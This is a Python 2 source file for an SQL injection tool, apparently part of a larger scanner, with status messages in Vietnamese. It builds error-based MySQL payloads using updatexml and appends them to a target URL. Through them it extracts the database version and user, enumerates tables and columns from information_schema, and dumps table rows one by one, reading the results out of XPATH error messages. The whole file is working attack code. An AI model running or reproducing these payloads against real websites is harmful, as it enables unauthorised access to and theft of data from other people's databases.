import re
import urllib2
import webbrowser
import socket
import wget
import os
import binascii
from urllib import urlencode
from sys import argv, exit
from sqli import *

class SQLI_XPath(SW_SQLI):
	def getInfo(self):
		tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,version(),0x7c,database(), 0x7c,user()))),0)-- -'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		self.params['info'] = self.parseResult(result,1)
		self.logQuery('-----------\n' + self.params['info'] + '\n-----------')
	
	def getTable(self):
		i = 0
		self.getNumberOfTable()
		while i < self.params['numoftable']:
			tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,table_name) from information_schema.tables WHERE table_schema=database() limit ' + str(i) +',1)),0)-- -'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs = self.parseResult(result,2)
			self.params['table'] += rs + ","
			i += 1
		self.logQuery('-----------\n' + self.params['table'] + '\n-----------')
	def getNumberOfTable(self):
		tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,count(table_name)) from information_schema.tables WHERE table_schema=database() limit 0,1)),0)-- -'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		print rs1
		self.params['numoftable'] = int(rs1)
		self.logQuery('-----------\n' + str(self.params['numoftable']) + '\n-----------')
		
	def getNumberOfColumn(self,tblname):
		tblnamehex = tblname.encode("hex")
		tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,count(column_name)) from information_schema.columns WHERE table_name=0x' + tblnamehex +'  limit 0,1)),0)-- -'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		self.params['numofcolumn'] = int(rs1)
		self.logQuery('-----------\n' + str(self.params['numofcolumn']) + '\n-----------')
	
	def getNumberOfRecord(self,tblname):
		tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c, count(*)) from ' + tblname + ' limit 0,1)),0)-- -'
		query = self.params['link'] + tmp
		result = self.doQuery(query)
		rs1 = self.parseResult(result,2)
		self.params['numofrecord'] = int(rs1)
		self.logQuery('-----------\n' + str(self.params['numofrecord']) + '\n-----------')
		
	def getColumn(self,tblname):
		i = 0
		tblnamehex = tblname.encode("hex")
		self.getNumberOfColumn(tblname)
		while i < self.params['numofcolumn']:
			tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,column_name) from information_schema.columns WHERE table_name=0x' + tblnamehex +' limit ' + str(i) +',1)),0)-- -'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs = self.parseResult(result,2)
			self.params['column'] += rs + ","
			i += 1
		self.logQuery('-----------\n' + self.params['column'] + '\n-----------')

	def getData(self,cols,tblname):
		self.params['data'] = ''
		col_arr = cols.split(",")
		col_q_list = ''
		for c in col_arr:
			col_q_list += c + ',0x7c,'
		col_q_list += '0x7f' ## Final barrier
		i = 0
		self.getNumberOfRecord(tblname)
		while i < self.params['numofrecord']:
			tmp = ' and updatexml(0,concat(0x7c,(select concat(0x7c,' + col_q_list + ') from '+ tblname +' limit ' + str(i) +',1)),0)-- -'
			query = self.params['link'] + tmp
			result = self.doQuery(query)
			rs = self.parseResult(result,2)
			self.params['data'] += rs + ","
			i += 1
		self.logQuery('-----------\n' + self.params['data'] + '\n-----------')
	
	def parseResult(self,htmlRes,a=1):
		if htmlRes:
			tag_s = "XPATH syntax error: '||"
			tag_e = "'\""
			begin = htmlRes.find(tag_s)
			if begin == -1:
				print "Khong the thuc hien sql injection...\n"
				return ""
				#exit()
			offset = 0
			end = htmlRes.find(tag_e,begin + 1)
			data = htmlRes[begin+len(tag_s):end]
			print "DATA-->" + data + "<--"
			return data
		else:
			print "Khong the ket noi...\n"
			#self.params['log'].close()
			#exit()